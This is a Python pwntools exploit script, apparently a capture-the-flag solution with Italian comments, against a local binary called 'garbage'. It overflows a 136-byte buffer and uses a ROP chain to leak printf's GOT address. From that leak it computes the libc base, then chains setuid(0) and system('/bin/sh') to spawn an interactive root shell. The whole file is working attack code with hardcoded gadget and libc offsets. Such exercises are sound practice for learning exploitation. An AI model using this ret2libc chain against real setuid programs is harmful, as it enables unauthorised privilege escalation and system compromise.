from pwn import *

p = process('./garbage')
#p = gdb.debug("./garbage", "b main")
garbage_file_reference = ELF('./garbage')

context(os='linux',arch='amd64')


#trovato con pattern create
buffer = b"A"*136



#ropper --file garbage --search "pop rdi; ret;"
pop_rdi = p64(0x40179b)

#got address di printf
got_printf = p64(garbage_file_reference.got['printf'])

#plt address di puts
plt_puts = p64(garbage_file_reference.plt['puts'])

#plt address di main
plt_main = p64(garbage_file_reference.symbols['main']) # Oppure con objdump -D, occhio a non prendere il primo (Ã¨ quello della libc)


# Stage 1: leaking dell'indirizzo vero di printf
payload = buffer + pop_rdi + got_printf + plt_puts + plt_main

# send payload when the programs start
p.sendline(payload)
p.recvuntil(b"access denied.\n")
leaked_printf_address = u64(p.recvline()[:-1].ljust(8,b'\x00'))




print('Leaked printf address 0x%x' % leaked_printf_address)


# Stage 2: Exploitation

#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep printf
libc_printf = 0x61c90

#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
libc_system_offset = 0x52290

#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep setuid
libc_setuid_offset = 0xe4150

#strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
libc_sh_offset = 0x1b45bd

#Base address
offset = leaked_printf_address - libc_printf

#indirizzo della system
libc_system = p64(offset + libc_system_offset)

#indirizzo di /bin/sh
libc_sh = p64(offset + libc_sh_offset)

#indirizzo setuid
libc_setuid = p64(offset + libc_setuid_offset)


#per allineare lo stack (qui non serve)
#ropper --file=garbage --search "ret;"     altrimenti la cerco dentro libc
ret_empty = p64(0x0401016)



#print(p64(0))
print(offset)
print(libc_system)
print(libc_sh)
print(libc_setuid)


#payload completo
payload_stage = buffer + pop_rdi + p64(0) + libc_setuid + pop_rdi + libc_sh + libc_system

#print(payload)
p.sendline(payload_stage)



p.interactive()